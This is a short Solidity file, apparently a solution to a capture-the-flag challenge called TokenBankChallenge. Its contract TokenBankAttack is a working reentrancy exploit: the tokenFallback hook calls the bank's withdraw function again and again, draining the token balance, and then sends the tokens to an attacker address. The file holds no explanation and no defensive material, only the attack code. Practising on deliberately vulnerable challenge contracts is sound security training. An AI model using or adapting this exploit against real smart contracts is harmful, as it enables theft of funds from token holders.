pragma solidity ^0.4.21;

import "../TokenBankChallenge.sol";

contract TokenBankAttack {
  TokenBankChallenge tokenBank;
  SimpleERC223Token token;
  address attacker;
  bool bankTransferPerformed;


  function TokenBankAttack(address _tokenBank, address _token, address _attacker) public {
    tokenBank = TokenBankChallenge(_tokenBank);
    token = SimpleERC223Token(_token);
    attacker = _attacker;
  }

  function perform() external {
    token.transfer(address(tokenBank), 500000 * 10**18);
    tokenBank.withdraw(500000 * 10**18);
    token.transfer(attacker, 1000000 * 10**18);
  }


  function tokenFallback(
    address from,
    uint256 value,
    bytes data
  ) external {
    if (
      token.balanceOf(tokenBank) == 0 ||
        from == attacker ||
          (bankTransferPerformed && from == address(tokenBank))
    ) {
      return;
    }

    if (from == address(tokenBank)) {
      bankTransferPerformed = true;
    }

    tokenBank.withdraw(500000 * 10**18);
  }
}
